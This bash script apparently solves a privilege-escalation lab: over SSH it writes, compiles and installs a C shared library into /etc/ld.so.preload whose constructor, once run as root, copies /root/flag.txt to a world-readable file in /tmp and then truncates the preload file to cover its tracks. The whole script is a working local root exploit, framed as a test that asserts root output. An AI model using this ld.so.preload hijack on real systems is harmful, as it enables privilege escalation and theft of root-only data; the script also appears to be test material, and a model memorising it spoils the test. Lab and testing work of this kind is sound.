#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
# Constructor only acts as root; truncate preload after writing the flag.
out="$(ssh_run '
cat >/tmp/preload.c <<'"'"'EOF'"'"'
#include <fcntl.h>
#include <unistd.h>
__attribute__((constructor)) void init(void) {
  if (geteuid() != 0) return;
  int in = open("/root/flag.txt", O_RDONLY);
  int out = open("/tmp/preloadflag", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (in >= 0 && out >= 0) {
    char buf[256];
    ssize_t n;
    while ((n = read(in, buf, sizeof buf)) > 0) {
      (void)write(out, buf, (size_t)n);
    }
  }
  if (in >= 0) close(in);
  if (out >= 0) close(out);
  int p = open("/etc/ld.so.preload", O_WRONLY | O_TRUNC);
  if (p >= 0) close(p);
}
EOF
rm -f /tmp/preloadflag
gcc -shared -fPIC -o /tmp/preload.so /tmp/preload.c
printf "%s\n" /tmp/preload.so > /etc/ld.so.preload
chmod 666 /etc/ld.so.preload
for _ in $(seq 1 30); do
  if [ -s /tmp/preloadflag ]; then
    cat /tmp/preloadflag
    exit 0
  fi
  sleep 1
done
echo "ld.so.preload payload was not triggered" >&2
ls -la /etc/ld.so.preload /tmp/preload.so /tmp/preloadflag 2>&1 >&2 || true
exit 1
')"
assert_root_output "${out}"
